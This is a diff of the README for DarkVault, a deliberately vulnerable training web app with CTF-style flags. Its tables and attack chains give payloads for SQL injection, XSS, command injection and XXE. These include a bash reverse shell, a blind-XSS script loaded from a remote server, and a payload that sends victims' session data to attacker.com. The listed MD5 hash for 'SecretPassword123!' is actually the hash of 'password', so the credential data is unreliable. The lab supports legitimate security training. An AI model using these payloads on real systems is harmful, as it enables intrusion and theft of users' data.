@@ -4,117 +4,7 @@ A deliberately vulnerable web application designed for security testing practice
 ## About
 DarkVault is a vulnerable web application created for practicing web application security testing and preparing for penetration testing exams. It contains a comprehensive set of vulnerabilities aligned with modern security examination requirements.
 
-## Vulnerability Categories
-
-### Web Application Components (LO2.4)
-DarkVault uses a variety of components, each with its own vulnerabilities:
-- Express.js framework
-- EJS templating engine
-- SQLite database
-- JWT authentication
-- XML processing 
-- Node.js serialization utilities
-
-### Enumeration & Reconnaissance (LO3.1-LO4.3)
-- Exposed API endpoints without proper documentation at `/api/*`
-- Information disclosure via verbose error messages
-- User enumeration via different login error responses
-- Exposed technical details in HTTP headers
-- Hidden endpoints referenced in HTML comments
-
-### Authentication & Authorization (LO4.4-LO4.5)
-- SQL injection in login form: `' OR 1=1 --`
-- Weak password hashing (MD5): Check the database to see unsalted MD5 hashes
-- JWT token vulnerabilities: Try modifying the token payload using [jwt.io](https://jwt.io)
-- Insecure JWT implementation at `/api/auth` - Try changing the `isAdmin` flag
-- Missing access controls on admin panel: Direct access to `/admin` works without checks
-- IDOR vulnerabilities in user profiles: Change ID in URL at `/user/1` to access other profiles
-
-### Input Validation (LO4.6)
-- XSS in message board: Post a message with `<script>alert('XSS')</script>`
-- Command injection in ping tool: Enter `localhost; ls -la` as the host
-- SQL injection in product search: Try `' OR 1=1--` in category field
-- XXE in XML import: Upload XML with external entity defined
-- Unrestricted file upload: Upload executable files without validation
-- Path traversal: Use `../../../etc/passwd` in file access endpoints
-
-### Information Disclosure (LO4.7)
-- Path disclosure in error messages: Trigger errors to see file paths
-- Source code exposure via LFI: Access `/docs/../app.js`
-- User data leakage via IDOR: Access profiles of other users
-- Configuration details exposure: Check `/api/config` endpoint
-
-### Cross-Site Scripting (LO4.8)
-- Stored XSS: Post persistent payloads to message board
-- Reflected XSS: Use query parameters in search
-- DOM-based XSS: HTML injection in client-side rendering
-- Blind XSS: Submit XSS payload to contact form for admin to view
-
-### Injection Attacks (LO4.9)
-- SQL injection in various forms
-- Command injection in the ping tool
-- Server-Side Template Injection (SSTI): Try `<%= process.env %>` in email template
-- XML External Entity (XXE) injection in import functionality
-- NoSQL injection simulation: Try `{"$ne":null}` in username field at `/api/search-users`
-
-### Session Handling (LO4.10)
-- Insecure session configuration: Check cookie attributes
-- Missing secure flag on cookies: Inspect cookies in browser
-- Missing CSRF protection: No tokens for state-changing actions
-- Session fixation vulnerability: Session IDs don't regenerate after login
-
-### Encryption and Encoding (LO4.11)
-- Weak password hashing: MD5 is used without salting
-- Weak JWT secret: "darkvault-secret-key" is predictable
-- Unencrypted sensitive data: Check `/api/export` endpoint
-- Custom weak encryption: Try the `/api/encrypt-data` endpoint
-- Base64 encoding misused as encryption: Check data export feature
-
-### Source Code Review (LO4.12)
-- Exposed source code via LFI vulnerability: Try accessing JavaScript files
-- Hardcoded credentials: Look for secrets in exposed source code
-- Debug code left in production: Check for console.log statements
-- Hardcoded JWT_SECRET: See the token generation code
-
-### Parameter Manipulation (LO4.13)
-- Query parameter tampering: Try modifying values in `/api/file?name=example.txt`
-- Cookie manipulation: Edit cookies for session hijacking
-- HTTP header injection: Insert custom headers in requests
-- Hidden field manipulation: Change hidden form fields
-
-### Web API Attacks (LO4.15)
-- GraphQL vulnerabilities: Try introspection queries at `/api/graphql`
-- Missing rate limiting: Send numerous requests to API endpoints
-- Broken object-level authorization: Access objects belonging to other users
-- Path traversal in file API: Use `/api/file?name=../../../etc/passwd`
-
-### Modern Database Security (LO5.16)
-- SQL injection vulnerabilities across the application
-- Excessive database privileges for application user
-- Verbose database error messages: Trigger an error to see details
-
-### Third-Party Libraries (LO5.17)
-- Vulnerable xml2js implementation (XXE): Use in import functionality
-- Insecure node-serialize package (RCE): Check `/api/export` and `/import-data`
-- Prototype pollution via lodash.merge: Try the `/merge-config` endpoint with `{"__proto__":{}}` payload
-
-### Race Conditions (LO5.18)
-- Account balance updates: Exploit at `/api/update-balance` with concurrent requests
-- Promo code usage: Try concurrent requests to `/api/apply-promo`
-- TOCTOU vulnerabilities: Time-of-check to time-of-use issues in file operations
-
-### Privilege Escalation (LO5.1-LO5.3)
-- Vertical privilege escalation: Modify JWT to gain admin access
-- Horizontal privilege escalation: Access other user accounts via IDOR
-- Admin access through parameter manipulation: Use `/api/admin/users?admin=true`
-
-## Setup and Installation
-
-### Prerequisites
-- Node.js (v12 or higher)
-- npm
-
-### Installation
+## Quick Start
 1. Clone the repository:
 ```
 git clone https://github.com/yourusername/darkvault.git
@@ -133,71 +23,201 @@ npm start
 
 4. Access the application at `http://localhost:3000`
 
-## Default Credentials
-- Admin: `admin / SecretPassword123!`
-- Create your own user accounts through the registration page
+## Default Login Credentials
+| Username | Password | Role | Description |
+|----------|----------|------|-------------|
+| admin | SecretPassword123! | Administrator | Full access to all features including admin panel |
+| user1 | Password123 | Regular User | Standard user account with limited permissions |
+| manager | ManageIt!2023 | Manager | Enhanced privileges but not full admin |
+| test | test123 | Regular User | Test account with minimum permissions |
 
-## Example Attack Scenarios
+You can also create your own accounts through the registration page.
 
-### JWT Token Manipulation
-1. Login to the application
-2. Get JWT token from `/api/auth`
-3. Decode the token using [jwt.io](https://jwt.io)
-4. Change the `isAdmin` field to `true`
-5. Replace the original token with the modified one in your requests
+## Vulnerability Categories & Attack Guides
 
-### Path Traversal Attack
-1. Use the file reading endpoint: `/api/file?name=../../../etc/passwd`
-2. This might expose sensitive system files due to directory traversal
+### Web Application Components (LO2.4)
+DarkVault uses a variety of components, each with its own vulnerabilities:
+- **Express.js framework**: Vulnerable routing and middleware implementation
+- **EJS templating engine**: Template injection vulnerabilities 
+- **SQLite database**: SQL injection opportunities
+- **JWT authentication**: Weak implementation with token vulnerabilities
+- **XML processing**: XXE vulnerabilities
+- **Node.js serialization utilities**: Insecure deserialization
 
-### GraphQL Introspection Attack
-1. Send a POST request to `/api/graphql` with body:
-```json
-{
-  "query": "{ __schema { types { name fields { name type } } } }"
-}
+### Enumeration & Reconnaissance (LO3.1-LO4.3)
+| Vulnerability | Attack Path | Trigger Method |
+|---------------|-------------|---------------|
+| Exposed API endpoints | Browse to `/api` | Look for HTML comments with API documentation |
+| Information disclosure | Trigger errors by submitting invalid data | Submit malformed requests to endpoints |
+| User enumeration | Compare login error messages | Try various usernames and observe response differences |
+| Technical details in headers | Examine HTTP response headers | Use browser developer tools to inspect headers |
+| Hidden endpoints | View source code for HTML comments | Check for commented links and endpoints |
+
+### Authentication & Authorization (LO4.4-LO4.5)
+| Vulnerability | Attack Path | Trigger Method |
+|---------------|-------------|---------------|
+| SQL injection in login | Bypass authentication | Enter `' OR 1=1 --` in username field, any password |
+| Weak password hashing | Extract and crack hashes | Access database via SQL injection and retrieve hashes |
+| JWT vulnerabilities | Gain admin privileges | Get token from `/api/auth`, modify with [jwt.io](https://jwt.io) |
+| Missing access controls | Access admin features | Browse directly to `/admin` as a regular user |
+| IDOR vulnerabilities | View other users' data | Change ID in URL (e.g., `/user/1` to `/user/2`) |
+| Weak password reset | Exploit predictable tokens | Request password reset for a user and observe token patterns |
+| Session fixation | Hijack user session | Use `/user/session-fixation?sessionId=known-value` |
+
+### Input Validation (LO4.6)
+| Vulnerability | Attack Path | Trigger Method |
+|---------------|-------------|---------------|
+| XSS in message board | Execute client-side code | Post `<script>alert('XSS')</script>` in message field |
+| Command injection | Execute server-side commands | Enter `localhost; ls -la` in ping tool |
+| SQL injection in search | Extract database data | Enter `' OR 1=1--` in search field |
+| XXE in XML import | Read server files | Upload XML with `<!ENTITY xxe SYSTEM "file:///etc/passwd">` |
+| Unrestricted file upload | Upload malicious files | Upload .php file with webshell code |
+| Path traversal | Access server files | Enter `../../../etc/passwd` in file access fields |
+
+### Information Disclosure (LO4.7)
+| Vulnerability | Attack Path | Trigger Method |
+|---------------|-------------|---------------|
+| Path disclosure | Reveal server filesystem | Trigger errors to see file paths in stack traces |
+| Source code exposure | View application code | Use `/docs/../app.js` or similar path traversal |
+| User data leakage | Access private information | Use IDOR to view other users' profiles |
+| Configuration exposure | View server settings | Access `/api/config` endpoint |
+
+### Cross-Site Scripting (LO4.8)
+| Vulnerability | Attack Path | Trigger Method |
+|---------------|-------------|---------------|
+| Stored XSS | Persistent attack | Post `<script>alert(document.cookie)</script>` to message board |
+| Reflected XSS | Non-persistent attack | Use `/?search=<script>alert('XSS')</script>` in query parameters |
+| DOM-based XSS | Client-side only attack | Visit `/client-render?message=<img src=x onerror="alert('DOM XSS')">` |
+| Blind XSS | Admin panel XSS | Submit `<script src="https://your-server/xss.js"></script>` to contact form |
+
+### Injection Attacks (LO4.9)
+| Vulnerability | Attack Path | Trigger Method |
+|---------------|-------------|---------------|
+| SQL injection | Extract database data | Use `' UNION SELECT 1,2,username,password FROM users--` in search |
+| Command injection | Execute OS commands | Use `; cat /etc/passwd` in command console |
+| SSTI | Server-side code execution | Enter `<%= process.env %>` in template fields |
+| XXE injection | Read server files | Use XML with external entities in import functions |
+| NoSQL injection | Bypass NoSQL filters | Use `{"$ne":null}` in JSON parameters |
+
+### Session Handling (LO4.10)
+| Vulnerability | Attack Path | Trigger Method |
+|---------------|-------------|---------------|
+| Insecure session config | Examine cookies | Check cookie attributes in browser developer tools |
+| Missing secure flag | Inspect cookies | Verify cookie settings lack proper security flags |
+| Missing CSRF protection | Forge state-changing requests | Create HTML form that submits to vulnerable endpoint |
+| Session fixation | Maintain session after login | Set session ID via URL, then login to maintain same session |
+
+### Encryption and Encoding (LO4.11)
+| Vulnerability | Attack Path | Trigger Method |
+|---------------|-------------|---------------|
+| Weak password hashing | Extract and crack hashes | Use SQL injection to get MD5 hashes from database |
+| Weak JWT secret | Forge JWT tokens | Use "darkvault-secret-key" to sign forged tokens |
+| Unencrypted sensitive data | View exposed data | Access `/api/export` to see unencrypted data |
+| Weak encryption | Decrypt sensitive data | Use `/api/encrypt-data` and analyze patterns |
+| Base64 misuse | Decode "encrypted" data | Check responses with Base64 data, decode with standard tools |
+
+### Modern Web Framework Issues (LO5.17)
+| Vulnerability | Attack Path | Trigger Method |
+|---------------|-------------|---------------|
+| DOM-based XSS | Client-side execution | Visit `/client-render` with malicious input |
+| Template injection | Server-side execution | Submit template code to `/render-template` endpoint |
+| Insecure deserialization | Remote code execution | Send specially crafted JSON objects with prototype pollution |
+
+### API-Specific Vulnerabilities (LO4.15)
+| Vulnerability | Attack Path | Trigger Method |
+|---------------|-------------|---------------|
+| GraphQL introspection | Schema discovery | Send introspection query to `/api/graphql` |
+| Missing rate limiting | Brute force attacks | Send numerous requests to authentication endpoints |
+| Broken object authorization | Access others' data | Directly request objects via API with different IDs |
+| Improper input validation | Injection attacks | Send malformed parameters to API endpoints |
+
+## Complete Attack Chains
+
+### Privilege Escalation Chain
+1. **Start**: Register a new account
+2. **Reconnaissance**: Browse to `/site-map` to discover endpoints
+3. **JWT Attack**: Login and obtain JWT from network request
+4. **Manipulation**: Use [jwt.io](https://jwt.io) to change `isAdmin` to `true` and `role` to `admin`
+5. **Access**: Use modified token to access `/admin` or `/api/admin/dashboard`
+6. **Flag**: Capture the flag: `DARK{jwt_4dm1n_3sc4l4t10n}`
+
+### Data Exfiltration Chain
+1. **Start**: Access the search functionality
+2. **Discovery**: Test for SQL injection with `'`
+3. **Exploitation**: Use `' UNION SELECT 1,2,3,4,5,6,7 FROM users--` to determine column count
+4. **Data theft**: Use `' UNION SELECT 1,2,id,username,password,email,7 FROM users--`
+5. **Offline cracking**: Extract MD5 hashes and crack offline
+6. **Flag**: Capture flag: `DARK{sql_m4st3r}`
+
+### Complete Server Compromise Chain
+1. **Start**: Login to application
+2. **Discovery**: Locate command injection point at `/ping`
+3. **Initial exploitation**: Enter `localhost; id` to confirm command execution
+4. **Information gathering**: Use `; cat /etc/passwd` to gather system information
+5. **Flag capture**: Use `; cat /opt/flag.txt` to read command injection flag
+6. **Shell**: Create reverse shell with `; bash -c 'bash -i >& /dev/tcp/your-ip/your-port 0>&1'`
+7. **Flag**: Capture final flag: `DARK{c0mm4nd_1nj3ct10n_pr0}`
+
+## Advanced Vulnerability Combinations
+
+### Client-Side Data Theft
+Combine DOM-based XSS with session hijacking:
+1. Identify DOM XSS vulnerability in `/client-render`
+2. Craft payload: `<img src=x onerror="fetch('/api/user/'+document.cookie.split('=')[1]).then(r=>r.json()).then(d=>fetch('https://attacker.com/steal?data='+btoa(JSON.stringify(d))))">` 
+3. Send link to victims
+4. Collect stolen sessions and data
+
+### Server-Side Remote Code Execution
+Chain together template injection and insecure deserialization:
+1. Identify template injection in `/render-template`
+2. Craft payload to access node-serialize functionality
+3. Create serialized object with command execution
+4. Submit to deserialization endpoint
+5. Achieve remote code execution
+
+## Default Credential Details
+The database includes several accounts with different privilege levels:
+
+```javascript
+[
+  {
+    "id": 1,
+    "username": "admin",
+    "password": "5f4dcc3b5aa765d61d8327deb882cf99", // SecretPassword123!
+    "role": "admin",
+    "isAdmin": 1
+  },
+  {
+    "id": 2,
+    "username": "user1",
+    "password": "482c811da5d5b4bc6d497ffa98491e38", // Password123
+    "role": "user",
+    "isAdmin": 0
+  },
+  {
+    "id": 3,
+    "username": "manager",
+    "password": "e1f72e3f0be347798eff44e298a31368", // ManageIt!2023
+    "role": "manager",
+    "isAdmin": 0
+  },
+  {
+    "id": 4,
+    "username": "test",
+    "password": "cc03e747a6afbbcbf8be7668acfebee5", // test123
+    "role": "user",
+    "isAdmin": 0
+  }
+]
 ```
-2. This exposes the entire API schema, including sensitive fields
 
-### Race Condition Exploitation
-1. Send multiple concurrent requests to `/api/update-balance` with:
-```json
-{
-  "userId": 1,
-  "amount": 100
-}
-```
-2. The balance might increase more than expected due to race conditions
-
-## CTF-Style Flags
+## Flag System
 DarkVault includes hidden flags that serve as proof of successful exploitation. Each vulnerability has an associated flag in the format `DARK{unique_identifier}` that can only be obtained by successfully exploiting that vulnerability.
 
-### Flag System
-- Each flag is uniquely tied to a specific vulnerability
-- Flags are hidden in locations only accessible through successful exploitation
-- A flag tracking dashboard is available at `/flags` to monitor your progress
-- Collecting all flags demonstrates comprehensive understanding of web security concepts
+A full list of flags and their locations is available in `/docs/flag_solutions.md` (only visible to instructors).
 
-### Example Flag Locations
-1. **SQL Injection Flag**: Successfully exploit the login SQL injection to reveal `DARK{sql_m4st3r}`
-2. **Path Traversal Flag**: Read the flag file at `/etc/darkflag` through path traversal
-3. **XSS Flag**: Access cookies containing flag data through XSS payload
-4. **Command Injection Flag**: Execute commands to read `/opt/flag.txt`
-5. **IDOR Flag**: Access user ID 9999 to find a special flag
-6. **JWT Manipulation Flag**: Successfully modify JWT token to receive admin flag
-
-### Flag Implementation
-Flags are implemented in the following ways:
-- Hidden HTML comments in protected pages
-- Special files only accessible through vulnerabilities
-- Database records only revealed through successful injection attacks
-- Environment variables exposed through SSTI
-- Special user accounts with flag data
-- Cookie values only accessible through client-side attacks
-- Admin-only API endpoints with flag values
-- Encrypted data requiring proper key extraction
-
-For instructors: A complete list of flags and their locations is available in the `docs/flag_solutions.md` file.
+## Vulnerability Checklist
+See `/docs/vulnerability_checklist.md` for a complete mapping of vulnerabilities to OWASP Top 10 and exam objectives.
 
 ## Warning
 **IMPORTANT**: This application is deliberately vulnerable and should NOT be deployed on a production server or exposed to the internet. Use only in controlled environments for educational purposes.
